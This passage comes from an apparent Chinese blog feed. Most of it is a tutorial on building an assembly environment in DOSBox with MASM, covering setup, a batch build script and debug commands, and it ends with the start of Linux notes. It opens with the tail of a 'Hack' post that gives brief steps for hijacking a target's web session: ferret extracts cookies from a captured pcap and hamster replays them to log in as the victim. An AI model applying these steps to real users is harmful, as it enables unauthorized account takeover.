<p>在目标主机上登录相对应的网站，尽量选择安全性较低的，登录要留存过程   </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ferret -r test.pcap</span><br></pre></td></tr></table></figure>
<p>处理流量，生成cookies文件hamster.text</p>
<p>启动hamster</p>
<p>打开浏览器地址栏输入127.0.0.1:1234<br>hamaster  找到目标IP 登录目标用户的网站</p>
<p><img src="https://i.loli.net/2021/04/27/yXlI61sZz5dhE8V.png" alt=""></p>
]]></content>
      <categories>
        <category>Hack</category>
      </categories>
      <tags>
        <tag>Hack</tag>
      </tags>
  </entry>
  <entry>
    <title>Windows10下搭建汇编语言开发环境</title>
    <url>/article/11317.html</url>
    <content><![CDATA[<h1 id="Windows10下搭建汇编语言开发环境"><a href="#Windows10下搭建汇编语言开发环境" class="headerlink" title="Windows10下搭建汇编语言开发环境"></a>Windows10下搭建汇编语言开发环境</h1><a id="more"></a>
<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>本学期学校安排有汇编语言这门课,需要自己搭建汇编语言开发环境,特此写下本文记录搭建过程.</p>
<p>关于搭建汇编语言开发环境的教程,我也找了许多,可看下来却依旧一头雾水,经过本人摸索,同时结合网上教程,欲写下这篇易懂的文章.</p>
<h2 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h2><h3 id="1-下载DOSBox"><a href="#1-下载DOSBox" class="headerlink" title="1.下载DOSBox"></a>1.下载DOSBox</h3><p>工具介绍:DOSBox是一个DOS模拟程序,由于它采用的是SDL库,所以可以很方便的移植到其他的平台.目前,DOSBox已经支持在Windows、Linux、Mac OS X、BeOS 、palmOS、Android 、webOS、os/2等系统中运行.不少DOS下的游戏都可以直接在该平台上运行.</p>
<p>工具官网:</p>
<p><a href="http://www.dosbox.com/" class="LinkCard" target="_blank">工具官网</a></p>
<p>项目主页：</p>
<p><a href="http://sourceforge.net/projects/dosbox" class="LinkCard" target="_blank">项目主页</a></p>
<p>下载链接1(32位):</p>
<p><a href="http://sourceforge.net/projects/dosbox/files/dosbox/0.74/DOSBox0.74-win32-installer.exe/download/" class="LinkCard" target="_blank">下载链接1</a></p>
<p>下载链接2(这个是我下载好的,可能会快一点):</p>
<p><a href="https://idefun.lanzoux.com/i91Xpm4qzyb" class="LinkCard">下载链接2</a></p>
<h3 id="2-下载汇编工具包"><a href="#2-下载汇编工具包" class="headerlink" title="2.下载汇编工具包"></a>2.下载汇编工具包</h3><p>下载链接:</p>
<p><a href="https://idefun.lanzoux.com/i4TQgm4zjkf/" class="LinkCard" target="_blank">下载链接</a></p>
<p>汇编工具截图</p>
<p><img src="https://i.loli.net/2021/02/25/vmXynkcD7V3bwEe.png" alt=""></p>
<h2 id="安装教程"><a href="#安装教程" class="headerlink" title="安装教程"></a>安装教程</h2><h3 id="1-安装DOSBox"><a href="#1-安装DOSBox" class="headerlink" title="1.安装DOSBox"></a>1.安装DOSBox</h3><p>双击运行DOSBox安装程序</p>
<p><img src="https://i.loli.net/2021/02/25/X7F4cripOvBg1ex.png" alt=""></p>
<p>点击next</p>
<p><img src="https://gitee.com/wxpgitee/images/raw/master/img/QXCsuzLV2YNwFBJ.png" alt=""></p>
<p>点击next</p>
<p><img src="https://i.loli.net/2021/02/25/Tr6jgH7u5XQElVD.png" alt=""></p>
<p>选择安装位置(我选择都是D:\DOSBox)然后点击install即可</p>
<p><img src="https://i.loli.net/2021/02/25/37Nqut1AGRfmYyx.png" alt=""></p>
<p>安装位置要记得,后面要用</p>
<h3 id="2-创建工作目录"><a href="#2-创建工作目录" class="headerlink" title="2.创建工作目录"></a>2.创建工作目录</h3><p>安装完毕创建一个工作目录(目录位置及目录名可自定义)</p>
<p>我的是在D:/DOSBox/Debug</p>
<p><img src="https://i.loli.net/2021/02/25/mGS1D2g8eMP6Bpx.png" alt=""></p>
<p>之后再在Debug下创建两个文件夹ASM(放自己写的汇编程序)和MASM(放汇编工具)</p>
<p><img src="https://i.loli.net/2021/02/25/OWEklSHxi1BeqbM.png" alt=""></p>
<p>将汇编工具放入MASM文件夹</p>
<p><img src="https://i.loli.net/2021/02/25/doXaBf7hCV4MmjH.png" alt=""></p>
<h3 id="3-挂载工作目录"><a href="#3-挂载工作目录" class="headerlink" title="3.挂载工作目录"></a>3.挂载工作目录</h3><p>打开DOSBox安装目录(我的在D:\DOSBox)</p>
<p><img src="https://i.loli.net/2021/02/25/5GCfg6hOt8UHvbi.png" alt=""></p>
<p>打开后找到DOSBox 0.74 Options.bat这个批处理文件</p>
<p><img src="https://i.loli.net/2021/02/25/b15TdjRzCasUB8c.png" alt=""></p>
<p>直接双击运行会出现一个记事本</p>
<p><img src="https://i.loli.net/2021/02/25/pJPAUlga1SRvuse.png" alt=""></p>
<p>使用快捷键Ctrl+F查找其中的[autoexec]部分(一般在文件末尾)</p>
<p><img src="https://i.loli.net/2021/02/25/PFvrz5jt4GAaDQb.png" alt=""></p>
<p>在文件中添加下列内容并保存</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">MOUNT F D:\DOSBox\Debug</span><br><span class="line">set PATH&#x3D;%PATH%;F:\MASM;</span><br><span class="line">F:</span><br><span class="line">cd F:\ASM</span><br><span class="line">cls</span><br></pre></td></tr></table></figure>
<p><img src="https://gitee.com/wxpgitee/images/raw/master/image-20210302185912863.png" alt=""></p>
<p>命令解释:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#挂载工作目录挂载到虚拟盘符F(虚拟盘符可自定义,命令不区分大小写)</span><br><span class="line">MOUNT F D:\DOSBox\Debug</span><br><span class="line">#添加系统临时变量(此时的F代表的是D:\DOSBox\Debug）</span><br><span class="line">set PATH&#x3D;%PATH%;F:\MASM; </span><br><span class="line">#转到F盘符</span><br><span class="line">F:</span><br><span class="line">#切换到F:\ASM目录</span><br><span class="line">cd F:\ASM</span><br><span class="line">#执行一次清屏</span><br><span class="line">cls</span><br></pre></td></tr></table></figure>
<p>如果不加cls,打开会是这样</p>
<p><img src="https://gitee.com/wxpgitee/images/raw/master/GtgYexwQulLnOKk.png" alt=""></p>
<p>加上cls,打开会是这样(我觉得更美观,依个人喜好)</p>
<p><img src="https://gitee.com/wxpgitee/images/raw/master/image-20210302190118748.png" alt=""></p>
<p>注意:不进行此种配置的话,每次打开DOSBox是需要手动输入上述命令,非常麻烦</p>
<h2 id="使用说明"><a href="#使用说明" class="headerlink" title="使用说明"></a>使用说明</h2><h3 id="DOSBox常用快捷键"><a href="#DOSBox常用快捷键" class="headerlink" title="DOSBox常用快捷键"></a>DOSBox常用快捷键</h3><div class="table-container">
<table>
<thead>
<tr>
<th>快捷键</th>
<th>作用</th>
</tr>
</thead>
<tbody>
<tr>
<td>Alt+Enter</td>
<td>切换全屏</td>
</tr>
<tr>
<td>Ctr+F1</td>
<td>改变键盘映射</td>
</tr>
<tr>
<td>Alt+Pause</td>
<td>暂停模拟</td>
</tr>
<tr>
<td>Ctrl+Alt+F5</td>
<td>开始/停止录制视频</td>
</tr>
<tr>
<td>Ctrl+F4</td>
<td>交换挂载的磁盘映像,也就是更新磁盘文件</td>
</tr>
<tr>
<td>Ctrl+F5</td>
<td>截图</td>
</tr>
<tr>
<td>Ctrl+F6</td>
<td>开始/停止录制声音</td>
</tr>
<tr>
<td>Ctrl+F7</td>
<td>减少跳帧</td>
</tr>
<tr>
<td>Ctrl+F8</td>
<td>增加跳帧</td>
</tr>
<tr>
<td>Ctrl+F9</td>
<td>关闭DOSBOX</td>
</tr>
<tr>
<td>Ctrl+F10</td>
<td>捕捉/释放鼠标</td>
</tr>
<tr>
<td>Ctrl+F11</td>
<td>模拟减速</td>
</tr>
<tr>
<td>Ctrl+F12</td>
<td>加速模拟</td>
</tr>
<tr>
<td>Alt+F12</td>
<td>不锁定速</td>
</tr>
</tbody>
</table>
</div>
<p>注意:以上快捷键我并没有全部测试,更多详细信息参见README.txt(在DOSBox安装目录中的Documentation里面)</p>
<p><img src="https://gitee.com/wxpgitee/images/raw/master/image-20210228111902877.png" alt=""></p>
<h3 id="调整窗口大小"><a href="#调整窗口大小" class="headerlink" title="调整窗口大小"></a>调整窗口大小</h3><p>初始的界面很小,且不能直接拉伸界面,所以有需要的可以按照下面的方法调整一下<br>双击打开DOSBox 0.74 Options.bat</p>
<p>使用快捷键Ctrl+F查找windowresolution字段</p>
<p><img src="https://i.loli.net/2021/02/25/8hrbIxNBJZQ723k.png" alt=""></p>
<p>将</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">windowresolution&#x3D;original</span><br><span class="line">output&#x3D;surface</span><br></pre></td></tr></table></figure>
<p>改为</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">windowresolution&#x3D;800x500  #800x500为自定义大小,可修改</span><br><span class="line">output&#x3D;opengl </span><br></pre></td></tr></table></figure>
<p>注意:不用删除原来的语句,在前面加上#注释掉即可</p>
<p><img src="https://i.loli.net/2021/02/25/YZwN2LOQPTuG8Wv.png" alt=""></p>
<p>保存后,重启DOSBox生效</p>
<h3 id="创建并编辑文件"><a href="#创建并编辑文件" class="headerlink" title="创建并编辑文件"></a>创建并编辑文件</h3><p>关于创建并编辑文件,如果你的工作目录(挂载的目录)有EDIT.COM文件(我提供的汇编工具包中有),那么你就可以在DOSBox中创建并编辑文件,如果没有请使用我提供的工具包或者耐心往下看.</p>
<h4 id="使用DOSBox创建并编辑文件-不推荐"><a href="#使用DOSBox创建并编辑文件-不推荐" class="headerlink" title="使用DOSBox创建并编辑文件(不推荐)"></a>使用DOSBox创建并编辑文件(不推荐)</h4><p>打开DOSBox使用下面命令创建并编辑test.asm文件</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">edit test.asm</span><br></pre></td></tr></table></figure>
<p><img src="https://i.loli.net/2021/02/25/ZWr6DIB4qxb9VEd.png" alt=""></p>
<p>回车后进入下面界面即可进行编辑(注意:鼠标箭头只能在编辑器里活动,想将鼠标退出来的话可以用Ctrl+F10组合键退出)</p>
<p><img src="https://i.loli.net/2021/02/25/WYMSUboDf82N7cG.png" alt=""></p>
<h4 id="使用记事本创建并编辑文件-其他编辑器也可以"><a href="#使用记事本创建并编辑文件-其他编辑器也可以" class="headerlink" title="使用记事本创建并编辑文件(其他编辑器也可以)"></a>使用记事本创建并编辑文件(其他编辑器也可以)</h4><p>下面以此种方式创建test.asm文件</p>
<p>新建文本文档,将下面代码复制到里面并保存</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">datas segment</span><br><span class="line">buf db&#39;Hello, World!$&#39;</span><br><span class="line">datas ends</span><br><span class="line"></span><br><span class="line">stacks segment stack</span><br><span class="line">db 200 dup(0)</span><br><span class="line">stacks ends</span><br><span class="line"></span><br><span class="line">codes segment</span><br><span class="line">assume cs:codes,ds:datas,ss:stacks</span><br><span class="line">start:</span><br><span class="line">mov ax,datas</span><br><span class="line">mov ds,ax</span><br><span class="line"></span><br><span class="line">mov dx,seg buf</span><br><span class="line">lea dx,buf</span><br><span class="line">mov ah,09h</span><br><span class="line">int 21h</span><br><span class="line"></span><br><span class="line">mov ah,4ch</span><br><span class="line">int 21h</span><br><span class="line">codes ends</span><br><span class="line">end start</span><br></pre></td></tr></table></figure>
<p><img src="https://i.loli.net/2021/02/25/jrcGQTxs8hgupvU.png" alt=""></p>
<p>之后重命名为test.asm</p>
<p><img src="https://i.loli.net/2021/02/25/lfQUBhXntJYV5qK.png" alt=""></p>
<h3 id="编译调试"><a href="#编译调试" class="headerlink" title="编译调试"></a>编译调试</h3><p>打开DOSBox输入下面命令</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">masm test.asm</span><br></pre></td></tr></table></figure>
<p>回车后会询问文件名,建议直接回车</p>
<p>编译程序提示输入交叉引用文件的名称,这个文件同列表文件一样,是编译器将源程序编译为目标文件过程中产生的中间结果.可以让编译器不生成这个文件,直接按Enter键即可</p>
<p><img src="https://i.loli.net/2021/02/25/VhRfkGB84zJyHAS.png" alt="image-20210225195117402"></p>
<p><img src="https://i.loli.net/2021/02/25/bYF13Vaz48fQ6uM.png" alt=""></p>
<p>可以像上图一样分别输入文件名,打开ASM查看如下</p>
<p><img src="https://i.loli.net/2021/02/25/TEDcVGa7yMz2SXJ.png" alt=""></p>
<p>本文全部默认即不分别输入文件名直接回车</p>
<p><img src="https://i.loli.net/2021/02/25/wfoIpsM62gWbFiz.png" alt=""></p>
<p>打开ASM文件夹查看如下</p>
<p><img src="https://i.loli.net/2021/02/25/TdPkfD7oRp5aZrB.png" alt=""></p>
<p>继续输入命令</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">link test.obj</span><br></pre></td></tr></table></figure>
<p><img src="https://i.loli.net/2021/02/25/d5LQbCi9n1AOPSk.png" alt=""></p>
<p>运行完毕,查看ASM文件夹</p>
<p><img src="https://i.loli.net/2021/02/25/P2G6sZqBlDQvKOE.png" alt=""></p>
<p>继续执行下列命令</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">debug test.exe</span><br></pre></td></tr></table></figure>
<p><img src="https://i.loli.net/2021/02/25/7zr4gBpDmUGi9nx.png" alt=""></p>
<h4 id="自动编译调试"><a href="#自动编译调试" class="headerlink" title="自动编译调试"></a>自动编译调试</h4><p>在实践过程中,如何你修改了text.txt(假设是创建的汇编代码文件),那么你就需要重新键入上述命令</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">masm test.txt</span><br><span class="line">link test.obj</span><br><span class="line">debug test.exe</span><br></pre></td></tr></table></figure>
<p>非常的麻烦,因此我用我现学的批处理知识实现自动完成这些过程,解放双手.</p>
<h5 id="实现过程"><a href="#实现过程" class="headerlink" title="实现过程"></a>实现过程</h5><p>详细过程如下:</p>
<p>在MASM文件夹下创建run.txt(名字自定义)</p>
<p><img src="https://gitee.com/wxpgitee/images/raw/master/image-20210418113051985.png" alt=""></p>
<p>打开run.txt,写入下面内容</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">@echo off</span><br><span class="line">masm %1.txt;</span><br><span class="line">echo *****************************</span><br><span class="line">echo Compilation completed!</span><br><span class="line">echo *****************************</span><br><span class="line">link %1;</span><br><span class="line">echo *****************************</span><br><span class="line">echo Link completed!</span><br><span class="line">echo *****************************</span><br><span class="line">echo Start debugging!</span><br><span class="line">echo *****************************</span><br><span class="line">debug %1.exe</span><br></pre></td></tr></table></figure>
<p>保存,重命名修改后缀.txt为.bat即可</p>
<p><img src="https://gitee.com/wxpgitee/images/raw/master/image-20210418113300980.png" alt=""></p>
<h5 id="实际使用"><a href="#实际使用" class="headerlink" title="实际使用"></a>实际使用</h5><p>以汇编文件t8.txt为例</p>
<p>在ASM文件夹创建汇编文件t8.txt(注意后缀必须是.txt)</p>
<p><img src="https://gitee.com/wxpgitee/images/raw/master/image-20210418113632835.png" alt=""></p>
<p>打开DOSBox,键入下列命令即可</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">run t8</span><br></pre></td></tr></table></figure>
<p>run是刚才创建的run.bat,t8是汇编文件t8.txt</p>
<p><img src="https://gitee.com/wxpgitee/images/raw/master/image-20210418113840786.png" alt=""></p>
<p>可见已经进入debug,并且ASM文件夹中也产生了.obj文件和.exe文件</p>
<p><img src="https://gitee.com/wxpgitee/images/raw/master/image-20210418113916125.png" alt=""></p>
<h3 id="debug的简单使用"><a href="#debug的简单使用" class="headerlink" title="debug的简单使用"></a>debug的简单使用</h3><p>debug是Dos、Windows提供的实模式(8086方式)程序的调试工具</p>
<ul>
<li>可以查看CPU各种寄存器的内容</li>
<li>可以查看内存的情况</li>
<li>可以在机器码级别跟踪程序的运行</li>
</ul>
<div class="table-container">
<table>
<thead>
<tr>
<th>命令</th>
<th>作用</th>
</tr>
</thead>
<tbody>
<tr>
<td>R命令</td>
<td>查看、改变CPU寄存器的内容</td>
</tr>
<tr>
<td>D命令</td>
<td>查看内存中的内容(机器指令形式)(以16进制显示)</td>
</tr>
<tr>
<td>E命令</td>
<td>改写内存中的内容,即提供指令(使用机器指令),用得比较少,多为A命令</td>
</tr>
<tr>
<td>U命令</td>
<td>查看内存中的内容(将机器指令形式转换为汇编指令的形式)(反编译)</td>
</tr>
<tr>
<td>T命令</td>
<td>执行一条汇编(机器)指令(就是执行当前指令缓冲器中的指令)</td>
</tr>
<tr>
<td>A命令</td>
<td>相比较E,以汇编指令形式在内存写入一条机器指令</td>
</tr>
<tr>
<td>P命令</td>
<td>执行汇编程序,单步跟踪.与T命令不同的是:P命令不会跟踪进入子程序或软中断;还可以用于结束本次循环,进入下一次循环</td>
</tr>
<tr>
<td>G命令</td>
<td>执行汇编指令,不过和T指令不同的是,G指令不是逐条执行,而是一次性执行多条</td>
</tr>
<tr>
<td>Q命令</td>
<td>退出debug</td>
</tr>
<tr>
<td>?命令</td>
<td>查看指令帮助</td>
</tr>
</tbody>
</table>
</div>
<h4 id="R命令"><a href="#R命令" class="headerlink" title="R命令"></a>R命令</h4><h5 id="查看CPU寄存器的内容"><a href="#查看CPU寄存器的内容" class="headerlink" title="查看CPU寄存器的内容"></a>查看CPU寄存器的内容</h5><p><img src="https://gitee.com/wxpgitee/images/raw/master/image-20210301085326154.png" alt=""></p>
<div class="table-container">
<table>
<thead>
<tr>
<th>标识名</th>
<th>置位</th>
<th>复位</th>
</tr>
</thead>
<tbody>
<tr>
<td>溢出Overflow(是否)</td>
<td>OV</td>
<td>NV</td>
</tr>
<tr>
<td>向Direction(减量/增量)</td>
<td>DN</td>
<td>UP</td>
</tr>
<tr>
<td>中断Interrupt(允许/屏蔽)</td>
<td>EI</td>
<td>DI</td>
</tr>
<tr>
<td>符号Sign(负正)</td>
<td>NG</td>
<td>PL</td>
</tr>
<tr>
<td>零Zero(是否)</td>
<td>ZR</td>
<td>NZ</td>
</tr>
<tr>
<td>辅助进位Auxiliary Carry(是否)</td>
<td>AC</td>
<td>NA</td>
</tr>
<tr>
<td>奇偶Parity(偶奇)</td>
<td>PE</td>
<td>PO</td>
</tr>
<tr>
<td>进位Carry(是否)</td>
<td>CY</td>
<td>NC</td>
</tr>
</tbody>
</table>
</div>
<h5 id="改变CPU寄存器的内容"><a href="#改变CPU寄存器的内容" class="headerlink" title="改变CPU寄存器的内容"></a>改变CPU寄存器的内容</h5><h6 id="改变寄存器的值"><a href="#改变寄存器的值" class="headerlink" title="改变寄存器的值"></a>改变寄存器的值</h6><p>若要修改一个寄存器中的值,比如AX中的值,可用R命令后加寄存器名来进行,输入”r ax”后按Enter键,将出现”:”作为输入提示,在后面输入要写入的数据后按Enter键(直接按Enter则退出修改),即完成了对AX中内容的修改.若想看一下修改的结果,可再用R命令查看(R命令与寄存器名之间也可以没有空格)</p>
<p><img src="https://i.loli.net/2021/02/25/rOLVwamUWvylcnE.png" alt=""></p>
<h6 id="改变CS-IP的值"><a href="#改变CS-IP的值" class="headerlink" title="改变CS:IP的值"></a>改变CS:IP的值</h6><p><img src="https://i.loli.net/2021/02/25/tdvuEMzlSUHI79C.png" alt=""></p>
<h6 id="改变标志位的值"><a href="#改变标志位的值" class="headerlink" title="改变标志位的值"></a>改变标志位的值</h6><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">rf</span><br></pre></td></tr></table></figure>
<p><img src="https://gitee.com/wxpgitee/images/raw/master/image-20210301095739288.png" alt=""></p>
<h4 id="D命令"><a href="#D命令" class="headerlink" title="D命令"></a>D命令</h4><p>使用D命令,可以查看内存中的内容,debug将输出3部分内容：</p>
<ol>
<li>中间是从指定地址开始的128个内存单元的内容,用16进制的格式输出,每行的输出从16的整数倍的地址开始,最多输出16个单元的内容.注意在每行的中间有一个”-“,它将每行的输出分为两部分,这样便于查看</li>
<li>左边是每行的起始地址</li>
<li>右边是每个内存单元中的数据对应的可显示的ASCII码字符.若没有对应可显示的ASCII字符,debug就用”.”来代替</li>
</ol>
<p><img src="https://gitee.com/wxpgitee/images/raw/master/image-20210228122306758.png" alt=""></p>
<blockquote>
<p>注意,我们看到的内存中的内容,在不同的计算机中是不一样的,也可能每次用<br>Debug看到的内容都不相同,因为我们用Debug看到的都是原来就在内存中的内容,这些内容受随时都有可能变化的系统环境的影响.当然,我们也可以改变内存、寄存器中的内容</p>
</blockquote>
<p>在一进入debug后,用D命令直接查看,将列出debug预设的地址处的内容</p>
<p><img src="https://gitee.com/wxpgitee/images/raw/master/image-20210228123326498.png" alt=""></p>
<p>使用d 段地址:偏移地址查看(以d 1000:0为例)</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">格式:d 段地址:偏移地址</span><br><span class="line">使用&quot;d 段地址:偏移地址&quot;的格式来查看,debug将列出从指定内存单元开始的128个内存单元的内容</span><br></pre></td></tr></table></figure>
<p><img src="https://gitee.com/wxpgitee/images/raw/master/image-20210228122452594.png" alt=""></p>
<p>在使用”d 段地址:偏移地址”之后,接着使用D命令,可列出后续的内容</p>
<p><img src="https://gitee.com/wxpgitee/images/raw/master/image-20210228123739626.png" alt=""></p>
<p>也可以指定D命令的查看范围,此时采用”d 段地址:起始偏移地址 结尾偏移地址”的格式</p>
<p><img src="https://gitee.com/wxpgitee/images/raw/master/image-20210228123922247.png" alt=""></p>
<p>若输入的地址不是16的倍数,则输出效果是这样的</p>
<p><img src="https://gitee.com/wxpgitee/images/raw/master/image-20210228123042937.png" alt=""></p>
<h4 id="E命令"><a href="#E命令" class="headerlink" title="E命令"></a>E命令</h4><p>改写内存中的内容,但是是以机器指令的形式</p>
<p>将内存1000:0-1000:9单元中的内容分别写为0、1、2、3….、9,可以用”e 段地址:起始地址 数据 数据 数据$\cdots $”的格式来进行</p>
<p><img src="https://gitee.com/wxpgitee/images/raw/master/image-20210228132259802.png" alt=""></p>
<p>用E命令以提问的方式来逐个地修改从某一地址开始的内存单元中的内容</p>
<p><img src="https://gitee.com/wxpgitee/images/raw/master/image-20210228132759807.png" alt=""></p>
<ul>
<li>红色部分为用户输入的修改的数据,到了某一内存单元的时候,可以选择修改(输入要修改的数值),也可以选择不修改(直接按空格),处理完一个内存单元之后,按空格,继续处理下一个内存单元;全部都处理完毕之后,按enter</li>
</ul>
<p>可以用E命令向内存中写入字符</p>
<p><img src="https://gitee.com/wxpgitee/images/raw/master/image-20210228133235259.png" alt=""></p>
<p>也可以用E命令向内存中写入字符串</p>
<p><img src="https://gitee.com/wxpgitee/images/raw/master/image-20210228133636393.png" alt=""></p>
<h4 id="U命令"><a href="#U命令" class="headerlink" title="U命令"></a>U命令</h4><p>对机器代码反汇编显示,U命令的显示输出分为3部分,每一条机器指令的地址、机器指令、机器指令所对应的汇编指令</p>
<h5 id="按地址反汇编"><a href="#按地址反汇编" class="headerlink" title="按地址反汇编"></a>按地址反汇编</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">u 地址</span><br></pre></td></tr></table></figure>
<p>该命令从指定地址开始,反汇编32个字节,若地址省略,则从上一个U命令的最后一个指令的下一个单元开始显示32个字节</p>
<p><img src="https://gitee.com/wxpgitee/images/raw/master/image-20210301100802300.png" alt=""></p>
<p><img src="https://gitee.com/wxpgitee/images/raw/master/image-20210301100844123.png" alt=""></p>
<h5 id="按范围反汇编"><a href="#按范围反汇编" class="headerlink" title="按范围反汇编"></a>按范围反汇编</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">u 范围</span><br></pre></td></tr></table></figure>
<p><img src="https://gitee.com/wxpgitee/images/raw/master/image-20210331215651518.png" alt=""></p>
<h4 id="T命令"><a href="#T命令" class="headerlink" title="T命令"></a>T命令</h4><h5 id="命令格式"><a href="#命令格式" class="headerlink" title="命令格式"></a>命令格式</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">T [&#x3D;地址] [指令数]</span><br></pre></td></tr></table></figure>
<p><img src="https://gitee.com/wxpgitee/images/raw/master/image-20210309132037512.png" alt=""></p>
<h5 id="使用T命令执行CS-IP指向的指令"><a href="#使用T命令执行CS-IP指向的指令" class="headerlink" title="使用T命令执行CS:IP指向的指令"></a>使用T命令执行CS:IP指向的指令</h5><p>首先用E命令向从1000:0开始的内存单元中写入了8个字节的机器码</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">e 1000:0 b8 01 00 b9 02 00 01 c8</span><br></pre></td></tr></table></figure>
<div class="table-container">
<table>
<thead>
<tr>
<th>机器码</th>
<th>对应的汇编指令</th>
</tr>
</thead>
<tbody>
<tr>
<td>b80100</td>
<td>mov ax,0001</td>
</tr>
<tr>
<td>b90200</td>
<td>mov cx,0002</td>
</tr>
<tr>
<td>01c8</td>
<td>add ax,cx</td>
</tr>
</tbody>
</table>
</div>
<p><img src="https://gitee.com/wxpgitee/images/raw/master/image-20210301075936404.png" alt=""></p>
<p>然后用R命令查看CPU中寄存器的状态,可以看到,CS=0740H、IP=0100H,指向内存0740:0100</p>
<p><img src="https://gitee.com/wxpgitee/images/raw/master/image-20210309112317133.png" alt=""></p>
<p>若要用T命令控制CPU执行我们写到1000:0 的指令,必须先让CS:IP指向1000:0;接着用R命令修改CS、IP中的内容,使CS:IP指向1000:0</p>
<p><img src="https://gitee.com/wxpgitee/images/raw/master/image-20210309113531977.png" alt=""></p>
<p>完成上面的步骤后,就可以使用T命令来执行我们写入的指令了(此时,CS:IP 指向我们的指令所在的内存单元).执行T命令后,CPU执行CS:IP指向的指令,则1000:0处的指令b8 01 00(mov ax,0001)得到执行,指令执行后,Debug 显示输出CPU中寄存器的状态</p>
<p><img src="https://gitee.com/wxpgitee/images/raw/master/image-20210309113809478.png" alt=""></p>
<blockquote>
<p>注意:指令执行后,AX中的内容被改写为1,IP改变为IP+3(因为mov ax,0001的指令长度为3个字节),CS:IP指向下一条指令</p>
</blockquote>
<p>继续使用T命令执行下面的指令</p>
<p><img src="https://gitee.com/wxpgitee/images/raw/master/image-20210309114535239.png" alt=""></p>
<blockquote>
<p>用T命令继续执行后面的指令,注意每条指令执行后,CPU相关寄存器内容的变化</p>
</blockquote>
<h4 id="A命令"><a href="#A命令" class="headerlink" title="A命令"></a>A命令</h4><p>使用E命令写入机器指令很不方便,最好能直接以汇编指令的形式写入指令.为此,Debug 提供了A命令,A命令以汇编指令的形式在内存中写入机器指令</p>
<p>首先用A命令,以汇编语言向从1000:0开始的内存单元中写入了几条指令,然后用D命令查看A命令的执行结果</p>
<p><img src="https://gitee.com/wxpgitee/images/raw/master/image-20210309115331666.png" alt=""></p>
<p>可以看到,在使用A命令写入指令时,我们输入的是汇编指令,Debug将这些汇编指令翻译为对应的机器指令,将它们的机器码写入内存</p>
<blockquote>
<p>使用A命令写入汇编指令时,在给出的起始地址后直接按Enter键表示操作结束</p>
</blockquote>
<p>若A命令后不跟地址,则从预设地址开始输入指令</p>
<p><img src="https://gitee.com/wxpgitee/images/raw/master/image-20210309115602136.png" alt=""></p>
<h4 id="P命令"><a href="#P命令" class="headerlink" title="P命令"></a>P命令</h4><p>在遇到汇编指令为int xx 时,使用p指令结束(否则CPU会指向一个未知的地址段)</p>
<p>在遇到loop循环时,可用p命令执行,debug会自动重复执行循环中的指令,直到cx=0为止,以下面程序为例</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">assume cs:code</span><br><span class="line">code segment</span><br><span class="line">	mov ax,236</span><br><span class="line">	mov cx,122</span><br><span class="line">	s:add ax,ax</span><br><span class="line">	loop s</span><br><span class="line">	</span><br><span class="line">	mov ax,4c00H</span><br><span class="line">	int 21H</span><br><span class="line">code ends</span><br><span class="line">end</span><br></pre></td></tr></table></figure>
<p><img src="https://gitee.com/wxpgitee/images/raw/master/image-20210331215104687.png" alt=""></p>
<h4 id="G命令"><a href="#G命令" class="headerlink" title="G命令"></a>G命令</h4><p>G命令的使用方法是：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">G[&#x3D;起始地址] [断点地址]</span><br></pre></td></tr></table></figure>
<p>意思是从起始地址开始执行到断点地址.如果不设置断点,则程序(从CS:IP)一直运行到中止指令才停止</p>
<p><img src="https://gitee.com/wxpgitee/images/raw/master/image-20210331214314467.png" alt=""></p>
<h4 id="命令"><a href="#命令" class="headerlink" title="?命令"></a>?命令</h4><p>输入?查看更多命令</p>
<p><img src="https://gitee.com/wxpgitee/images/raw/master/image-20210228112817615.png" alt=""></p>
<p>结果如下:</p>
<p><img src="https://gitee.com/wxpgitee/images/raw/master/image-20210228112748762.png" alt=""></p>
]]></content>
      <categories>
        <category>汇编语言</category>
      </categories>
      <tags>
        <tag>汇编语言</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux学习笔记</title>
    <url>/article/34487.html</url>
    <content><![CDATA[<h1 id="Linux学习笔记"><a href="#Linux学习笔记" class="headerlink" title="Linux学习笔记"></a>Linux学习笔记</h1><a id="more"></a>
<h2 id="Linux注意事项"><a href="#Linux注意事项" class="headerlink" title="Linux注意事项"></a>Linux注意事项</h2><p>Ctrl+a  快速回到行首</p>
<p>Ctrl+e  快速回到行末</p>
<p>Linux严格区分大小写.</p>
<p>Linux中所有内容以文件形式保存，包括硬件</p>
<ul>
<li>硬盘文件是/dev/sd[a-p]</li>
<li>光盘文件是/dev/sr0</li>
</ul>
<p>Linux不靠扩展名区分文件类型(扩展名便于用户使用),靠文件权限</p>
<ul>
<li>压缩包: “*.gz”、”*.bz2”、”*.tar.bz2”、”*.tgz”等</li>
<li>二进制软件包: “*.rpm”</li>
<li>网页文件: “*.html”、”*.php”</li>
<li>脚本文件: “*.sh”</li>
<li>配置文件: “*.conf”</li>
</ul>
<p>Linux所有的存储设备都必须挂载,之后用户才能使用,包括硬盘、U盘和光盘</p>
<p>Windows下的程序不能直接在Iinux中安装和运行</p>
